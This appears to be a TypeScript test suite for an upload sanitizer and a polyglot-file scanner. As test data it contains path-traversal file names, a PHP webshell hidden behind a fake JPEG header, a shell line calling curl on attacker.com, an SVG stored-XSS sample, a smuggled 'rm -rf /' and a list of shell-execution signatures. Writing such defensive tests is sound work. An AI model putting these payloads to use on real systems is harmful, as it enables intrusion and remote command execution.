import { describe, it } from 'node:test';
import assert from 'node:assert/strict';

function sanitizeFileName(name: string): string {
  if (!name) return 'photo.jpg';

  // Strip path traversal characters, control characters, and null bytes
  return name
    .replace(/[\0\r\n\t]/g, '')
    .replace(/^.*[\\\/]/, '')
    .replace(/[^a-zA-Z0-9._\- ()]/g, '_')
    .slice(0, 255);
}

const SUSPICIOUS_BINARY_PATTERNS = [
  Buffer.from('<?php', 'ascii'),
  Buffer.from('<?= ', 'ascii'),
  Buffer.from('<script', 'ascii'),
  Buffer.from('</script>', 'ascii'),
  Buffer.from('javascript:', 'ascii'),
  Buffer.from('base64_decode(', 'ascii'),
  Buffer.from('eval(', 'ascii'),
  Buffer.from('system(', 'ascii'),
  Buffer.from('passthru(', 'ascii'),
  Buffer.from('shell_exec(', 'ascii'),
  Buffer.from('/bin/sh', 'ascii'),
  Buffer.from('/bin/bash', 'ascii'),
  Buffer.from('cmd.exe', 'ascii'),
  Buffer.from('powershell', 'ascii'),
];

function scanPhotoBufferForPolyglot(buffer: Buffer, fileName: string = 'upload'): void {
  if (!buffer || buffer.length === 0) {
    throw new Error('photo.emptyFile');
  }

  if (
    buffer.slice(0, 100).toString('ascii').toLowerCase().includes('<svg') ||
    fileName.toLowerCase().endsWith('.svg')
  ) {
    throw new Error('photo.invalidFileType');
  }

  for (const pattern of SUSPICIOUS_BINARY_PATTERNS) {
    const foundIndex = buffer.indexOf(pattern);
    if (foundIndex !== -1) {
      throw new Error('photo.maliciousFileDetected');
    }
  }
}

describe('File Upload & Polyglot Sanitization Test Suite', () => {
  describe('Path Traversal & Filename Neutralization', () => {
    it('neutralizes unix directory traversal payloads', () => {
      assert.strictEqual(sanitizeFileName('../../../etc/passwd'), 'passwd');
      assert.strictEqual(sanitizeFileName('../../../../var/www/html/shell.php'), 'shell.php');
      assert.strictEqual(sanitizeFileName('./folder/image.png'), 'image.png');
    });

    it('neutralizes windows directory traversal payloads', () => {
      assert.strictEqual(sanitizeFileName('..\\..\\..\\windows\\system32\\cmd.exe'), 'cmd.exe');
      assert.strictEqual(sanitizeFileName('C:\\inetpub\\wwwroot\\web.config'), 'web.config');
    });

    it('strips null byte injection characters', () => {
      assert.strictEqual(sanitizeFileName('exploit.php\0.jpg'), 'exploit.php.jpg');
      assert.strictEqual(sanitizeFileName('payload\0\0\0.png'), 'payload.png');
    });

    it('sanitizes dangerous characters into safe underscores and strips paths', () => {
      assert.strictEqual(sanitizeFileName('my photo; rm -rf /.jpg'), '.jpg');
      assert.strictEqual(sanitizeFileName('my photo; rm -rf.jpg'), 'my photo_ rm -rf.jpg');
      assert.strictEqual(sanitizeFileName('photo`<script>.jpg'), 'photo__script_.jpg');
    });

    it('truncates excessively long filenames', () => {
      const longName = 'A'.repeat(300) + '.jpg';
      const result = sanitizeFileName(longName);
      assert.strictEqual(result.length <= 255, true);
    });
  });

  describe('Malicious Polyglot & Stored XSS Defense', () => {
    it('strictly blocks SVG image uploads to prevent XML/SVG Stored XSS', () => {
      assert.throws(() => {
        scanPhotoBufferForPolyglot(Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'), 'graphic.svg');
      }, /photo.invalidFileType/);

      assert.throws(() => {
        scanPhotoBufferForPolyglot(Buffer.from('<?xml version="1.0"?><svg></svg>'), 'disguised.png');
      }, /photo.invalidFileType/);
    });

    it('detects and rejects embedded PHP webshell polyglots', () => {
      const fakeJpegWithPhp = Buffer.concat([
        Buffer.from([0xff, 0xd8, 0xff, 0xe0]), // Fake JPEG header
        Buffer.from('Some image metadata... <?php system($_GET["cmd"]); ?>')
      ]);

      assert.throws(() => {
        scanPhotoBufferForPolyglot(fakeJpegWithPhp, 'picture.jpg');
      }, /photo.maliciousFileDetected/);
    });

    it('detects and rejects embedded shell script execution payloads', () => {
      const payload = Buffer.concat([
        Buffer.from([0x89, 0x50, 0x4e, 0x47]), // Fake PNG header
        Buffer.from('random data /bin/sh -c "curl attacker.com"')
      ]);

      assert.throws(() => {
        scanPhotoBufferForPolyglot(payload, 'test.png');
      }, /photo.maliciousFileDetected/);
    });

    it('accepts clean authentic binary image buffers', () => {
      const cleanJpeg = Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46, 0x49, 0x46]);
      assert.doesNotThrow(() => {
        scanPhotoBufferForPolyglot(cleanJpeg, 'photo.jpg');
      });
    });
  });
});
